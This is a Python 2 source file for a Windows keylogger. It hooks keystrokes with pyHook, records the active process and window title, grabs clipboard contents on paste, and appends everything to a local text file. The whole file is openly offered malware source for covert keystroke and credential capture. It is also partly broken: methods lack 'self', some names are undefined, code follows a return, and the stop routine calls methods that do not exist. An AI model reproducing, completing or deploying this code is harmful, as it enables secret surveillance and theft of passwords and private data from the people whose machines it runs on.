from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import threading
import sys
import win32api




class keylogger(threading.Thread):
    def __init__(self, num, interval):  
        threading.Thread.__init__(self)  
        self.thread_num = num  
        self.interval = interval  
        self.thread_stop = False  
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi
        self.current_window = None
    
    
    
    
    
    def get_current_process():
        # get a handle to the foreground window
        hwnd = self.user32.GetForegroundWindow()
    
        # find the process ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
        # store the current process ID
        process_id = "%d" % pid.value
    
        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    
        # now read it's title
        window_title = create_string_buffer("\x00" * 512)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
        # print out the header if we're in the right process
        print
        print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        print
        
        return "[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
    
        
    
        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)
    
    
    def KeyStroke(event):
        global current_window
        fileHandle = open ('C:\\pyworks\\before\\keylogger.txt', 'a' )
    
        msg = ""
    
        # check to see if target changed windows
        if event.WindowName != current_window:
            current_window = event.WindowName
            msg += get_current_process()
            
    
        # if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
            msg += str(chr(event.Ascii))
            print chr(event.Ascii),
            
        else:
            # if [Ctrl-V], get the value on the clipboard
            # added by Dan Frisch 2014
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                msg += "[PASTE] - %s" % (pasted_value)
                print "[PASTE] - %s" % (pasted_value),
            else:
                msg += "[%s]" % event.Key
                print "[%s]" % event.Key,
        
        fileHandle.write(msg)
        fileHandle.close()
        # pass execution to next hook registered
        return True
    
    
        # create and register a hook manager
    
    
    
    def run():
        kl = pyHook.HookManager()
        kl.KeyDown = KeyStroke
        
        # register the hook and execute forever
        kl.HookKeyboard()
        pythoncom.PumpMessages(5000)
        hm.UnhookKeyboard()
        win32api.PostQuitMessage(0) 
    
    
    # raise exceptions.SystemExit
    
    def stop(self):
        sys.setrecursionlimit(4000)  
        self.Close(True)
        self.Destroy()
